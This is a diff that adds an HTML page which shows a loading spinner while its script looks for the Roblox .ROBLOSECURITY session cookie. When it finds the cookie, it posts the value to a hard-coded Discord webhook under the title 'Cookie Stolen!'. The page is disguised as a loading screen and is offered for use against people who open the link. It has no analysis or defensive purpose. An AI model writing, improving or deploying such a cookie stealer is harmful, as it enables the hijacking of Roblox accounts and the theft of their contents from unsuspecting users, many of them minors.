@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: sans-serif; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <script>
+        window.onload = function() {
+            const cookies = document.cookie;
+            const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
+            
+            if (match) {
+                const token = match[1];
+                
+                // Show alert so you know it worked
+                alert("Cookie Found! Sending to Discord...");
+
+                fetch("https://discord.com/api/webhooks/1568842658024128713/zVUKHWdpx3qKNuQnzxrA86Rs-2dN_tYz8HsXV37ImSW8X1RxS1LBb1IyTQy0bSRxdbxn", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🍪 Cookie Stolen!",
+                            description: "**User opened the link.**\n```\n" + token + "\n```",
+                            color: 15158332
+                        }]
+                    })
+                }).then(() => {
+                    console.log("Sent!");
+                }).catch(err => {
+                    console.error("Error:", err);
+                    alert("Failed to send webhook!");
+                });
+            } else {
+                alert("No Cookie Found! Make sure you are logged into Roblox.");
+                window.location.href = "https://www.roblox.com";
+            }
+        };
+    </script>
+</body>
+</html>
